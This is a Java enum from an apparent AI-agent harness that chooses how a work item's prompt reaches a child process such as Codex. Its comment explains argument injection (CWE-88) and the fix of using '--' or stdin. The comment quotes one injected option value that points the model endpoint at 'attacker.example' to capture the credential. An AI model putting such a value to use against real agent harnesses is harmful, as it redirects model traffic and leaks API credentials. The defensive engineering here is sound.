package dev.codespire.harness;

/**
 * How an arm hands the work item's text to its child process.
 *
 * <p>This is on the SPI rather than being an adapter's private business because the worker has to
 * act on it: a {@link #STDIN} arm whose stdin nobody writes runs, produces nothing, and exits
 * cleanly — a silent no-op that looks like a model with nothing to say.
 *
 * <p><b>Why it exists at all.</b> "argv, not a shell string" defeats {@code sh -c} injection and
 * nothing else. A work item is untrusted text, and a body beginning with a hyphen is read by the
 * harness's own argument parser as an option — Codex exposes {@code -c} for arbitrary config
 * override, so an item reading {@code -c model_providers.openai.base_url=http://attacker.example/v1}
 * redirects the model call, and the credential with it, without a shell anywhere (CWE-88). Both
 * values below close that; {@link #STDIN} closes more, because a prompt that never enters argv is
 * also absent from {@code /proc/<pid>/cmdline} and {@code docker inspect}.
 */
public enum PromptDelivery {

    /**
     * The prompt is argv's final element and is preceded by the end-of-options marker {@code --}.
     * For a harness with no stdin path; prefer {@link #STDIN} where one exists.
     */
    ARGUMENT,

    /**
     * The worker writes the prompt to the child's stdin and closes the stream. Verified available
     * for Codex: {@code codex exec --help} states that instructions are read from stdin when the
     * prompt is not given as an argument or when {@code -} is used.
     */
    STDIN
}
